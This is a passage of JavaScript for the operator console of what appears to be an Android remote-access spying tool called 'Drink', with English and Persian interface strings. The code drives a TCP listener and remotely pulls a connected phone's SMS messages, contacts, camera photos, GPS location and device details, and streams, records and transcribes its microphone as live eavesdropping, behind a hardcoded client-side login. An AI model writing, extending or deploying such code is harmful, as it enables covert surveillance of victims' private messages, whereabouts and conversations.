    close: "Close",
    hours: "Hours",
    login_title: "Admin Console",
    login_subtitle: "Enter credentials to access the panel",
    username: "Username",
    password: "Password",
    sign_in: "Sign In",
    logout: "Logout",
    invalid_cred: "Invalid username or password",
    device_telemetry: "Device Telemetry",
    fetch_telemetry: "Fetch Telemetry",
    fetching: "Fetching…",
    telemetry_not_fetched: "No telemetry fetched yet. Click 'Fetch Telemetry' to retrieve device status on demand without battery drain.",
    battery_power: "Battery & Power",
    charging_state: "Charging Status",
    power_source: "Power Source",
    battery_temp: "Temperature",
    battery_voltage: "Voltage",
    battery_health: "Health",
    network_info: "Network Information",
    network_type: "Network Type",
    wifi_ssid: "WiFi SSID",
    local_ip: "Local IP",
    cellular_carrier: "Cellular Carrier",
    storage_memory: "Storage & Memory",
    internal_storage: "Internal Storage",
    ram_memory: "RAM Memory",
    device_os: "Device & OS Details",
    model: "Model",
    manufacturer: "Manufacturer",
    android_version: "Android Version",
    security_patch: "Security Patch",
    uptime: "System Uptime",
    gps_location: "GPS Location",
    latitude: "Latitude",
    longitude: "Longitude",
    accuracy: "Accuracy",
    altitude: "Altitude",
    open_gmaps: "Google Maps",
    open_osm: "OpenStreetMap",
    no_gps_data: "GPS location unavailable or permission not granted",
    audio_gain: "Gain Booster",
    listen_live: "Listen",
    mute_audio: "Mute",
    record_audio: "Record",
    stop_recording: "Stop & Save",
    speech_transcription: "Transcribe",
    stt_placeholder: "Listening for speech…"
  },
  fa: {
    brand: "درینک",
    tcp_stopped: "TCP: متوقف",
    tcp_listening: "TCP: در حال شنود",
    client_disconnected: "کلاینت: قطع شده",
    client_connected: "کلاینت: متصل",
    mic_off: "میکروفون: خاموش",
    mic_streaming: "میکروفون: در حال پخش",
    server_host: "سرور و اتصال",
    tcp_target: "مقصد TCP",
    remote_address: "کلاینت از راه دور",
    session_status: "وضعیت کلاینت",
    listen_state: "وضعیت شنود",
    idle: "بیکار",
    active_listening: "در حال شنود فعال",
    stopped: "متوقف شده",
    start_listen: "شروع شنود",
    stop_listen: "توقف شنود",
    kill_server: "خاتمه سرور",
    disconnect_client: "قطع اتصال",
    online: "آنلاین",
    waiting_connection: "در انتظار اتصال…",
    server_stopped: "سرور متوقف",
    mic_stream: "جریان میکروفون",
    stream_mode: "وضعیت جریان",
    inactive: "غیرفعال",
    streaming_live: "در حال پخش زنده",
    audio_route: "مسیر صدا",
    start_mic: "شروع میکروفون",
    stop_mic: "توقف میکروفون",
    cam_capture: "عکسبرداری دوربین",
    no_photo: "عکسی ثبت نشده است",
    list_cams: "بروزرسانی",
    take_photo: "ثبت عکس",
    sms_title: "پیامک‌ها",
    fetch_sms: "دریافت",
    download_sms: "خروجی",
    no_messages: "پیامی بارگذاری نشده",
    contacts: "مخاطبین",
    pull_device: "دریافت از دستگاه",
    download_zip: "دانلود ZIP",
    activity_console: "کنسول فعالیت‌ها",
    clear: "پاکسازی",
    search_sms_ph: "جستجو بر اساس شماره یا متن پیام…",
    start_date: "از تاریخ",
    end_date: "تا تاریخ",
    all: "همه",
    received: "دریافتی",
    sent: "ارسالی",
    search_contacts_ph: "جستجوی مخاطب با نام یا شماره…",
    copy: "کپی",
    no_contacts_found: "مخاطبی یافت نشد",
    no_sms_criteria: "پیامکی با این مشخصات یافت نشد",
    download_photo: "دانلود عکس",
    close: "بستن",
    hours: "ساعت",
    login_title: "کنسول مدیریت",
    login_subtitle: "جهت ورود به پنل اطلاعات را وارد کنید",
    username: "نام کاربری",
    password: "رمز عبور",
    sign_in: "ورود به پنل",
    logout: "خروج",
    invalid_cred: "نام کاربری یا رمز عبور اشتباه است",
    device_telemetry: "تله‌متری دستگاه",
    fetch_telemetry: "دریافت وضعیت",
    fetching: "در حال دریافت…",
    telemetry_not_fetched: "هنوز تله‌متری دریافت نشده است. جهت دریافت دستی اطلاعات بدون مصرف باتری روی 'دریافت وضعیت' کلیک کنید.",
    battery_power: "باتری و منبع تغذیه",
    charging_state: "وضعیت شارژ",
    power_source: "منبع برق",
    battery_temp: "دما",
    battery_voltage: "ولتاژ",
    battery_health: "سلامت باتری",
    network_info: "اطلاعات شبکه",
    network_type: "نوع اتصال",
    wifi_ssid: "نام وای‌فای (SSID)",
    local_ip: "آی‌پی محلی",
    cellular_carrier: "اپراتور همراه",
    storage_memory: "حافظه و رم",
    internal_storage: "حافظه داخلی",
    ram_memory: "حافظه رم",
    device_os: "مشخصات دستگاه و سیستم",
    model: "مدل",
    manufacturer: "سازنده",
    android_version: "نسخه اندروید",
    security_patch: "وصله امنیتی",
    uptime: "مدت زمان روشن بودن",
    gps_location: "موقعیت مکانی GPS",
    latitude: "عرض جغرافیایی",
    longitude: "طول جغرافیایی",
    accuracy: "دقت",
    altitude: "ارتفاع",
    open_gmaps: "گوگل مپ",
    open_osm: "اوپن‌استریت‌مپ",
    no_gps_data: "اطلاعات موقعیت مکانی در دسترس نیست یا مجوز داده نشده است",
    audio_gain: "تقویت صدا",
    listen_live: "شنود",
    mute_audio: "قطع صدا",
    record_audio: "ضبط صدا",
    stop_recording: "توقف و ذخیره",
    speech_transcription: "رونویسی",
    stt_placeholder: "کلمات گفته شده در محیط اینجا نمایش داده می‌شوند…"
  }
};

function t(key) {
  return (I18N[currentLang] && I18N[currentLang][key]) || (I18N['en'] && I18N['en'][key]) || key;
}

function initLanguage() {
  const saved = localStorage.getItem('drink_lang') || 'en';
  setLanguage(saved);
}

function toggleLanguage() {
  const next = currentLang === 'en' ? 'fa' : 'en';
  setLanguage(next);
}

function setLanguage(lang) {
  currentLang = lang;
  localStorage.setItem('drink_lang', lang);
  const btn = document.getElementById('btnLang');
  if (btn) {
    btn.textContent = lang === 'en' ? 'FA' : 'EN';
  }
  if (lang === 'fa') {
    document.body.classList.add('lang-fa');
    document.documentElement.setAttribute('lang', 'fa');
    document.documentElement.setAttribute('dir', 'rtl');
  } else {
    document.body.classList.remove('lang-fa');
    document.documentElement.setAttribute('lang', 'en');
    document.documentElement.setAttribute('dir', 'ltr');
  }
  applyTranslations();
  refreshStatus();
  filterMessages();
  if (allContacts.length > 0) filterContacts();
  if (window.latestTelemetryData) renderTelemetryData(window.latestTelemetryData);
}

function applyTranslations() {
  document.querySelectorAll('[data-i18n]').forEach(el => {
    const key = el.getAttribute('data-i18n');
    el.textContent = t(key);
  });
  document.querySelectorAll('[data-i18n-ph]').forEach(el => {
    const key = el.getAttribute('data-i18n-ph');
    el.setAttribute('placeholder', t(key));
  });
  document.querySelectorAll('[data-i18n-title]').forEach(el => {
    const key = el.getAttribute('data-i18n-title');
    el.setAttribute('title', t(key));
  });
}

function initTheme() {
  const saved = localStorage.getItem('drink_theme') || 'light';
  applyTheme(saved);
}

function toggleTheme() {
  const current = document.body.classList.contains('dark-mode') ? 'dark' : 'light';
  const next = current === 'dark' ? 'light' : 'dark';
  applyTheme(next);
}

function applyTheme(theme) {
  const icon = document.getElementById('themeIcon');
  if (theme === 'dark') {
    document.body.classList.add('dark-mode');
    if (icon) {
      icon.innerHTML = '<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>';
    }
  } else {
    document.body.classList.remove('dark-mode');
    if (icon) {
      icon.innerHTML = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>';
    }
  }
  localStorage.setItem('drink_theme', theme);
}

function checkAuth() {
  const isAuth = sessionStorage.getItem('drink_authenticated') === 'true';
  const loginScreen = document.getElementById('loginScreen');
  const mainApp = document.getElementById('mainApp');
  if (isAuth) {
    loginScreen.style.display = 'none';
    mainApp.style.display = 'block';
  } else {
    loginScreen.style.display = 'flex';
    mainApp.style.display = 'none';
  }
}

function submitLogin() {
  const user = (document.getElementById('loginUser').value || '').trim();
  const pass = document.getElementById('loginPass').value || '';
  const err = document.getElementById('loginError');
  if (user === 'msr' && pass === 'kos') {
    sessionStorage.setItem('drink_authenticated', 'true');
    err.style.display = 'none';
    checkAuth();
    refreshStatus();
    refreshLogs();
    loadContactsList();
    initCardAudioContext();
  } else {
    err.textContent = t('invalid_cred');
    err.style.display = 'block';
  }
}

function logout() {
  sessionStorage.removeItem('drink_authenticated');
  checkAuth();
}

async function api(path, options = {}) {
  try {
    const res = await fetch(path, options);
    return await res.json();
  } catch (e) {
    return null;
  }
}

function switchWorkspaceTab(tabName) {
  currentTab = tabName;
  document.getElementById('tabBtnSms').className = 'tab-btn' + (tabName === 'sms' ? ' active' : '');
  document.getElementById('tabBtnContacts').className = 'tab-btn' + (tabName === 'contacts' ? ' active' : '');
  document.getElementById('tabBtnTelemetry').className = 'tab-btn' + (tabName === 'telemetry' ? ' active' : '');
  document.getElementById('tabBtnConsole').className = 'tab-btn' + (tabName === 'console' ? ' active' : '');

  document.getElementById('panelSms').className = 'tab-panel' + (tabName === 'sms' ? ' active' : '');
  document.getElementById('panelContacts').className = 'tab-panel' + (tabName === 'contacts' ? ' active' : '');
  document.getElementById('panelTelemetry').className = 'tab-panel' + (tabName === 'telemetry' ? ' active' : '');
  document.getElementById('panelConsole').className = 'tab-panel' + (tabName === 'console' ? ' active' : '');

  if (tabName === 'sms') {
    filterMessages();
  } else if (tabName === 'contacts') {
    if (allContacts.length === 0) {
      loadContactsList();
    } else {
      filterContacts();
    }
  } else if (tabName === 'telemetry') {
    if (window.latestTelemetryData) {
      renderTelemetryData(window.latestTelemetryData);
    }
    setTimeout(() => {
      if (telMap) telMap.invalidateSize();
    }, 150);
  } else if (tabName === 'console') {
    refreshLogs();
  }
}

async function toggleServerListen() {
  if (isListening) {
    await stopServer();
  } else {
    await startServer();
  }
}

async function startServer() {
  await api('/api/server/start', { method: 'POST' });
  refreshStatus();
}

async function stopServer() {
  await api('/api/server/stop', { method: 'POST' });
  refreshStatus();
}

async function killServer() {
  if (confirm('Terminate server process?')) {
    await api('/api/server/kill', { method: 'POST' });
    document.body.innerHTML = '<div style="padding: 60px; text-align: center; font-family: -apple-system, sans-serif;"><h2>Server process killed.</h2></div>';
  }
}

async function disconnectClient() {
  await api('/api/client/disconnect', { method: 'POST' });
  refreshStatus();
}

async function toggleMic() {
  if (isMicActive) {
    await stopMic();
  } else {
    await startMic();
  }
}

async function startMic() {
  await api('/api/client/mic/start', { method: 'POST' });
  refreshStatus();
}

async function stopMic() {
  await api('/api/client/mic/stop', { method: 'POST' });
  refreshStatus();
}

async function listCameras() {
  const res = await api('/api/client/cameras', { method: 'POST' });
  if (res && res.data) {
    renderCamPills(res.data);
  }
}

function renderCamPills(cams) {
  const box = document.getElementById('camPillsBox');
  box.innerHTML = '';
  if (!cams || cams.length === 0) {
    cams = ['0', '1'];
  }
  cams.forEach(cam => {
    const pill = document.createElement('button');
    pill.className = 'cam-pill-btn' + (cam === selectedCamId ? ' active' : '');
    pill.textContent = (currentLang === 'fa' ? 'دوربین ' : 'Cam ') + cam;
    pill.onclick = () => {
      selectedCamId = cam;
      renderCamPills(cams);
    };
    box.appendChild(pill);
  });
}

async function captureSelectedCamera() {
  const res = await api('/api/client/camera/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cam_id: selectedCamId })
  });
  if (res && res.status === 'ok') {
    const img = document.getElementById('camPreviewImg');
    const empty = document.getElementById('camPreviewEmpty');
    img.src = '/api/photo/latest?t=' + Date.now();
    img.style.display = 'block';
    empty.style.display = 'none';
  }
}

function openPhotoModal() {
  const img = document.getElementById('camPreviewImg');
  if (img.style.display !== 'none' && img.src) {
    document.getElementById('photoModalImg').src = img.src;
    document.getElementById('photoModalBackdrop').style.display = 'flex';
  }
}

function closePhotoModal() {
  document.getElementById('photoModalBackdrop').style.display = 'none';
}

async function pullContacts() {
  await api('/api/client/contacts', { method: 'POST' });
  loadContactsList();
}

async function loadContactsList() {
  const res = await api('/api/contacts/list');
  if (res && res.contacts) {
    allContacts = res.contacts;
    document.getElementById('badgeContactsCount').textContent = allContacts.length;
    if (allContacts.length > 0) {
      document.getElementById('btnWorkspaceDlZip').style.display = 'inline-flex';
    }
    filterContacts();
  }
}

function filterContacts() {
  const q = (document.getElementById('contactsSearchInput').value || '').toLowerCase().trim();
  const grid = document.getElementById('workspaceContactsGrid');
  grid.innerHTML = '';

  const filtered = allContacts.filter(c => {
    const name = (c.name || '').toLowerCase();
    const phone = (c.phone || '').toLowerCase();
    return name.includes(q) || phone.includes(q);
  });

  document.getElementById('badgeContactsCount').textContent = filtered.length;

  if (filtered.length === 0) {
    grid.innerHTML = `<div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); padding: 50px 20px; font-size: 0.88rem;">${t('no_contacts_found')}</div>`;
    return;
  }

  filtered.forEach(c => {
    const card = document.createElement('div');
    card.className = 'contact-box';
    const name = c.name || (currentLang === 'fa' ? 'بدون نام' : 'Unnamed');
    const phone = c.phone || (currentLang === 'fa' ? 'بدون شماره' : 'No phone');
    const initial = name.charAt(0).toUpperCase() || '?';
    card.innerHTML = `
      <div class="contact-avatar-bubble">${initial}</div>
      <div class="contact-details">
        <div class="contact-title">${name}</div>
        <a href="tel:${phone}" class="contact-num-link">${phone}</a>
      </div>
      <button class="btn-secondary" style="padding: 4px 8px; font-size: 0.72rem;" onclick="copyText('${phone}')">${t('copy')}</button>
    `;
    grid.appendChild(card);
  });
}

function copyText(txt) {
  navigator.clipboard.writeText(txt);
}

async function getSms(hours) {
  const res = await api('/api/client/sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ hours: parseInt(hours) || 24 })
  });
  if (res && res.data) {
    allMessages = res.data;
    filterMessages();
  }
}

function downloadSms() {
  const data = (window.lastFilteredSms && window.lastFilteredSms.length > 0) ? window.lastFilteredSms : allMessages;
  if (!data || data.length === 0) {
    alert(currentLang === 'fa' ? 'پیامکی برای دانلود وجود ندارد' : 'No SMS messages to download');
    return;
  }
  const jsonStr = JSON.stringify(data, null, 2);
  const blob = new Blob([jsonStr], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `drink_sms_${Date.now()}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function setDirFilter(dir) {
  currentDirFilter = dir;
  document.getElementById('pillDirAll').className = 'filter-item-pill' + (dir === 'all' ? ' active' : '');
  document.getElementById('pillDirIn').className = 'filter-item-pill' + (dir === 'in' ? ' active' : '');
  document.getElementById('pillDirOut').className = 'filter-item-pill' + (dir === 'out' ? ' active' : '');
  filterMessages();
}

function clearSmsDateFilter() {
  document.getElementById('smsStartDate').value = '';
  document.getElementById('smsEndDate').value = '';
  filterMessages();
}

function filterMessages() {
  const q = (document.getElementById('smsSearchInput').value || '').toLowerCase().trim();
  const startVal = document.getElementById('smsStartDate').value;
  const endVal = document.getElementById('smsEndDate').value;
  const stack = document.getElementById('workspaceMessagesStack');
  stack.innerHTML = '';

  const startTime = startVal ? new Date(startVal + 'T00:00:00').getTime() : null;
  const endTime = endVal ? new Date(endVal + 'T23:59:59.999').getTime() : null;

  const filtered = allMessages.filter(m => {
    if (currentDirFilter === 'in' && m.type !== 1) return false;
    if (currentDirFilter === 'out' && m.type === 1) return false;

    if (q) {
      const addr = (m.address || '').toLowerCase();
      const body = (m.body || '').toLowerCase();
      if (!addr.includes(q) && !body.includes(q)) return false;
    }

    if (m.date) {
      if (startTime !== null && m.date < startTime) return false;
      if (endTime !== null && m.date > endTime) return false;
    }

    return true;
  });

  window.lastFilteredSms = filtered;
  document.getElementById('badgeSmsCount').textContent = filtered.length;

  if (filtered.length === 0) {
    stack.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 50px 20px; font-size: 0.88rem;">${t('no_sms_criteria')}</div>`;
    return;
  }

  filtered.forEach(m => {
    const card = document.createElement('div');
    card.className = 'msg-item-card';
    const isReceived = m.type === 1;
    const dirTag = isReceived ? `<span class="msg-tag msg-tag-in">${t('received')}</span>` : `<span class="msg-tag msg-tag-out">${t('sent')}</span>`;
    const dStr = m.date ? new Date(m.date).toLocaleString(currentLang === 'fa' ? 'fa-IR' : 'en-US') : '';
    card.innerHTML = `
      <div class="msg-header-row">
        <div style="display: flex; align-items: center; gap: 8px;">
          ${dirTag}
          <strong style="font-size: 0.85rem;">${m.address || '?'}</strong>
        </div>
        <span style="color: var(--text-muted);">${dStr}</span>
      </div>
      <div class="msg-text-body">${m.body || ''}</div>
    `;
    stack.appendChild(card);
  });
}

async function refreshStatus() {
  const s = await api('/api/status');
  if (!s) return;

  isListening = !!s.listening;
  isMicActive = !!s.mic_active;

  const pTcp = document.getElementById('pillTcp');
  const tTcp = document.getElementById('txtTcp');
  const btnHStart = document.getElementById('btnHeaderStart');
  const txtHStart = document.getElementById('txtHeaderStart');
  const btnCStart = document.getElementById('btnToggleListenCard');

  if (isListening) {
    pTcp.className = 'badge badge-active';
    tTcp.textContent = t('tcp_listening');
    btnHStart.className = 'btn-danger';
    txtHStart.textContent = t('stop_listen');
    btnCStart.className = 'btn-danger';
    btnCStart.textContent = t('stop_listen');
    document.getElementById('valListenState').textContent = t('active_listening');
  } else {
    pTcp.className = 'badge';
    tTcp.textContent = t('tcp_stopped');
    btnHStart.className = 'btn-success';
    txtHStart.textContent = t('start_listen');
    btnCStart.className = 'btn-primary';
    btnCStart.textContent = t('start_listen');
    document.getElementById('valListenState').textContent = t('stopped');
  }

  const pClient = document.getElementById('pillClient');
  const tClient = document.getElementById('txtClient');
  if (s.client_connected) {
    pClient.className = 'badge badge-active';
    tClient.textContent = t('client_connected');
    document.getElementById('valClientAddr').textContent = s.client_addr || (currentLang === 'fa' ? 'متصل' : 'Connected');
    document.getElementById('valClientStatus').textContent = t('online');
  } else {
    pClient.className = 'badge';
    tClient.textContent = t('client_disconnected');
    document.getElementById('valClientAddr').textContent = currentLang === 'fa' ? 'قطع شده' : 'Disconnected';
    document.getElementById('valClientStatus').textContent = isListening ? t('waiting_connection') : t('server_stopped');
  }

  const pMic = document.getElementById('pillMic');
  const tMic = document.getElementById('txtMic');
  const btnMic = document.getElementById('btnToggleMic');
  const txtMic = document.getElementById('txtBtnMic');
  if (isMicActive) {
    pMic.className = 'badge badge-warning';
    tMic.textContent = t('mic_streaming');
    document.getElementById('valMicStatus').textContent = t('streaming_live');
    btnMic.className = 'btn-danger';
    txtMic.textContent = t('stop_mic');
  } else {
    pMic.className = 'badge';
    tMic.textContent = t('mic_off');
    document.getElementById('valMicStatus').textContent = t('inactive');
    btnMic.className = 'btn-success';
    txtMic.textContent = t('start_mic');
  }

  if (s.cameras && s.cameras.length > 0) {
    renderCamPills(s.cameras);
  }

  if (s.contacts_count !== undefined) {
    document.getElementById('badgeContactsCount').textContent = s.contacts_count;
  }

  if (s.has_telemetry && s.telemetry) {
    if (!window.latestTelemetryData) {
      renderTelemetryData(s.telemetry);
    } else if (s.telemetry.battery) {
      const b = s.telemetry.battery;
      const pillBat = document.getElementById('pillBattery');
      const txtBat = document.getElementById('txtBattery');
      pillBat.style.display = 'inline-flex';
      const pct = b.level >= 0 ? b.level : 0;
      txtBat.textContent = `${b.charging ? '⚡ ' : ''}${pct}% (${b.plugged || 'Battery'})`;
    }
  }
}

let cardAudioCtx = null;
let cardAudioWs = null;
let cardGainNode = null;
let cardAnalyser = null;
let isCardListening = false;
let isCardRecording = false;
let cardRecordedChunks = [];
let cardRecordTimer = null;
let cardRecordSeconds = 0;
let cardSttRec = null;
let isCardSttRunning = false;
let cardNextTime = 0;

function initCardAudioContext() {
  if (cardAudioCtx) return;
  cardAudioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
  cardAnalyser = cardAudioCtx.createAnalyser();
  cardAnalyser.fftSize = 256;
  cardGainNode = cardAudioCtx.createGain();
  cardGainNode.gain.value = 1.0;
  cardGainNode.connect(cardAnalyser);
  cardAnalyser.connect(cardAudioCtx.destination);
  startCardWaveformDraw();
}

function startCardWaveformDraw() {
  const canvas = document.getElementById('cardMicCanvas');
  if (!canvas) return;
  const ctx2d = canvas.getContext('2d');
  const vuBar = document.getElementById('cardVuBar');
  const bufLen = cardAnalyser.frequencyBinCount;
  const dataArray = new Uint8Array(bufLen);

  function render() {
    requestAnimationFrame(render);
    cardAnalyser.getByteTimeDomainData(dataArray);

    ctx2d.fillStyle = document.body.classList.contains('dark-mode') ? '#141416' : '#1c1c20';
    ctx2d.fillRect(0, 0, canvas.width, canvas.height);

    ctx2d.lineWidth = 1.5;
    ctx2d.strokeStyle = '#34c759';
    ctx2d.beginPath();

    const slice = canvas.width * 1.0 / bufLen;
    let x = 0;
    let maxDiff = 0;

    for (let i = 0; i < bufLen; i++) {
      const v = dataArray[i] / 128.0;
      const y = v * (canvas.height / 2);
      const diff = Math.abs(dataArray[i] - 128);
      if (diff > maxDiff) maxDiff = diff;

      if (i === 0) ctx2d.moveTo(x, y);
      else ctx2d.lineTo(x, y);
      x += slice;
    }
    ctx2d.lineTo(canvas.width, canvas.height / 2);
    ctx2d.stroke();

    if (vuBar) {
      const pct = Math.min(100, Math.round((maxDiff / 128.0) * 100 * 1.6));
      vuBar.style.width = pct + '%';
      if (pct > 70) vuBar.style.backgroundColor = 'var(--danger)';
      else if (pct > 35) vuBar.style.backgroundColor = 'var(--warning)';
      else vuBar.style.backgroundColor = 'var(--success)';
    }
  }
  render();
}

function toggleCardAudio() {
  initCardAudioContext();
  if (!isCardListening) {
    isCardListening = true;
    document.getElementById('btnCardListen').className = 'btn btn-primary';
    document.getElementById('txtCardListen').textContent = t('mute_audio');
    ensureCardAudioWs();
  } else {
    isCardListening = false;
    document.getElementById('btnCardListen').className = 'btn btn-secondary';
    document.getElementById('txtCardListen').textContent = t('listen_live');
  }
}

function ensureCardAudioWs() {
  if (cardAudioWs && (cardAudioWs.readyState === WebSocket.OPEN || cardAudioWs.readyState === WebSocket.CONNECTING)) {
    return;
  }
  cardAudioWs = new WebSocket('ws://' + location.hostname + ':' + location.port + '/ws/audio');
  cardAudioWs.binaryType = 'arraybuffer';
  cardAudioWs.onmessage = (event) => {
    const pcm = new Int16Array(event.data);
    if (isCardRecording) {
      cardRecordedChunks.push(new Int16Array(pcm));
    }
    if (isCardListening && cardAudioCtx) {
      const float32 = new Float32Array(pcm.length);
      for (let i = 0; i < pcm.length; i++) {
        float32[i] = pcm[i] / 32768.0;
      }
      const buffer = cardAudioCtx.createBuffer(1, float32.length, 16000);
      buffer.copyToChannel(float32, 0);
      const source = cardAudioCtx.createBufferSource();
      source.buffer = buffer;
      source.connect(cardGainNode);
      const now = cardAudioCtx.currentTime;
      const startAt = Math.max(now, cardNextTime);
      source.start(startAt);
      cardNextTime = startAt + buffer.duration;
    }
  };
  cardAudioWs.onclose = () => {
    if (isCardListening || isCardRecording) {
      setTimeout(ensureCardAudioWs, 1500);
    }
  };
}

function setCardGain(val) {
  initCardAudioContext();
  const v = parseFloat(val);
  if (cardGainNode) cardGainNode.gain.value = v;
  document.getElementById('cardGainVal').textContent = v.toFixed(1) + 'x';
}

function toggleCardRecord() {
  initCardAudioContext();
  ensureCardAudioWs();
  const btn = document.getElementById('btnCardRecord');
  const dot = document.getElementById('cardRecDot');
  const txt = document.getElementById('txtCardRecord');

  if (!isCardRecording) {
    isCardRecording = true;
    cardRecordedChunks = [];
    cardRecordSeconds = 0;
    btn.className = 'btn btn-danger';
    dot.className = 'rec-pulse-dot active';
    txt.textContent = '00:00';
    cardRecordTimer = setInterval(() => {
      cardRecordSeconds++;
      const m = String(Math.floor(cardRecordSeconds / 60)).padStart(2, '0');
      const s = String(cardRecordSeconds % 60).padStart(2, '0');
      txt.textContent = `${m}:${s}`;
    }, 1000);
  } else {
    isCardRecording = false;
    clearInterval(cardRecordTimer);
    btn.className = 'btn btn-secondary';
    dot.className = 'rec-pulse-dot';
    txt.textContent = t('record_audio');
    saveCardRecording();
  }
}

function saveCardRecording() {
  if (cardRecordedChunks.length === 0) return;
  let totalSamples = 0;
  for (let c of cardRecordedChunks) totalSamples += c.length;
  const wavBuffer = new ArrayBuffer(44 + totalSamples * 2);
  const view = new DataView(wavBuffer);

  function writeStr(offset, str) {
    for (let i = 0; i < str.length; i++) {
      view.setUint8(offset + i, str.charCodeAt(i));
    }
  }

  writeStr(0, 'RIFF');
  view.setUint32(4, 36 + totalSamples * 2, true);
  writeStr(8, 'WAVE');
  writeStr(12, 'fmt ');
  view.setUint32(16, 16, true);
  view.setUint16(20, 1, true);
  view.setUint16(22, 1, true);
  view.setUint32(24, 16000, true);
  view.setUint32(28, 32000, true);
  view.setUint16(32, 2, true);
  view.setUint16(34, 16, true);
  writeStr(36, 'data');
  view.setUint32(40, totalSamples * 2, true);

  let offset = 44;
  for (let c of cardRecordedChunks) {
    for (let i = 0; i < c.length; i++) {
      view.setInt16(offset, c[i], true);
      offset += 2;
    }
  }

  const blob = new Blob([wavBuffer], { type: 'audio/wav' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `drink_mic_${Date.now()}.wav`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  cardRecordedChunks = [];
}

function toggleCardStt() {
  const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SpeechRec) {
    alert('Speech recognition is not supported in this browser');
    return;
  }
  const drawer = document.getElementById('cardSttDrawer');
  const btn = document.getElementById('btnCardStt');
  const txtBox = document.getElementById('cardSttText');

  if (!isCardSttRunning) {
    cardSttRec = new SpeechRec();
    cardSttRec.continuous = true;
    cardSttRec.interimResults = true;
    cardSttRec.lang = currentLang === 'fa' ? 'fa-IR' : 'en-US';
    cardSttRec.onstart = () => {
      isCardSttRunning = true;
      drawer.style.display = 'block';
      btn.className = 'btn btn-danger';
      document.getElementById('txtCardStt').textContent = t('stop_recording');
    };
    cardSttRec.onresult = (e) => {
      let res = '';
      for (let i = 0; i < e.results.length; i++) {
        res += e.results[i][0].transcript + ' ';
      }
      if (res.trim()) {
        txtBox.textContent = res;
        txtBox.scrollTop = txtBox.scrollHeight;
      }
    };
    cardSttRec.onerror = () => {
      isCardSttRunning = false;
      btn.className = 'btn btn-secondary';
      document.getElementById('txtCardStt').textContent = t('speech_transcription');
    };
    cardSttRec.onend = () => {
      if (isCardSttRunning) {
        try { cardSttRec.start(); } catch(e){}
      } else {
        btn.className = 'btn btn-secondary';
        document.getElementById('txtCardStt').textContent = t('speech_transcription');
      }
    };
    cardSttRec.start();
  } else {
    isCardSttRunning = false;
    if (cardSttRec) cardSttRec.stop();
    btn.className = 'btn btn-secondary';
    document.getElementById('txtCardStt').textContent = t('speech_transcription');
  }
}

function copyCardStt() {
  navigator.clipboard.writeText(document.getElementById('cardSttText').textContent);
}

function clearCardStt() {
  document.getElementById('cardSttText').textContent = '';
}

let telMap = null;
let telMarker = null;
let telCircle = null;
window.latestTelemetryData = null;

async function fetchDeviceTelemetry() {
  const btn = document.getElementById('btnFetchTel');
  const txt = document.getElementById('txtBtnFetchTel');
  txt.textContent = t('fetching');
  btn.disabled = true;
  try {
    const res = await api('/api/client/telemetry', { method: 'POST' });
    if (res && res.data) {
      renderTelemetryData(res.data);
    }
  } finally {
    txt.textContent = t('fetch_telemetry');
    btn.disabled = false;
  }
}

function renderTelemetryData(tData) {
  if (!tData) return;
  window.latestTelemetryData = tData;

  document.getElementById('txtTelLastUpdated').textContent = (currentLang === 'fa' ? 'آخرین بروزرسانی: ' : 'Last updated: ') + new Date().toLocaleTimeString();
  document.getElementById('telEmptyBox').style.display = 'none';
  document.getElementById('telContentBox').style.display = 'flex';

  if (tData.battery) {
    const b = tData.battery;
    const pct = b.level >= 0 ? b.level : 0;
    document.getElementById('telBatteryHeaderPct').textContent = b.level >= 0 ? `${pct}%` : '--';
    const bBar = document.getElementById('telBatteryBar');
    bBar.style.width = pct + '%';
    if (pct > 50) bBar.style.backgroundColor = 'var(--success)';
    else if (pct > 20) bBar.style.backgroundColor = 'var(--warning)';
    else bBar.style.backgroundColor = 'var(--danger)';

    document.getElementById('telCharging').textContent = b.charging ? (currentLang === 'fa' ? 'در حال شارژ' : 'Charging') : (currentLang === 'fa' ? 'درحال مصرف' : 'Discharging');
    document.getElementById('telPlugged').textContent = b.plugged || '--';
    document.getElementById('telTemp').textContent = b.temperature ? `${b.temperature} °C` : '--';
    document.getElementById('telVolt').textContent = b.voltage ? `${b.voltage} V` : '--';
    document.getElementById('telHealth').textContent = b.health || '--';

    const pillBat = document.getElementById('pillBattery');
    const txtBat = document.getElementById('txtBattery');
    pillBat.style.display = 'inline-flex';
    txtBat.textContent = `${b.charging ? '⚡ ' : ''}${pct}% (${b.plugged || 'Battery'})`;
  }

  if (tData.network) {
    const n = tData.network;
    document.getElementById('telNetType').textContent = n.type || '--';
    document.getElementById('telNetSsid').textContent = n.ssid || '--';
    document.getElementById('telNetIp').textContent = n.ip || '--';
    document.getElementById('telCarrier').textContent = n.carrier || '--';
  }

  if (tData.storage) {
    const st = tData.storage;
    const totalGb = (st.total_bytes / (1024 * 1024 * 1024)).toFixed(1);
    const usedGb = (st.used_bytes / (1024 * 1024 * 1024)).toFixed(1);
    const freeGb = (st.free_bytes / (1024 * 1024 * 1024)).toFixed(1);
    const pct = st.total_bytes > 0 ? Math.round((st.used_bytes / st.total_bytes) * 100) : 0;
    document.getElementById('telStorageText').textContent = `${usedGb} GB / ${totalGb} GB (${pct}%) — ${freeGb} GB ${t('free')}`;
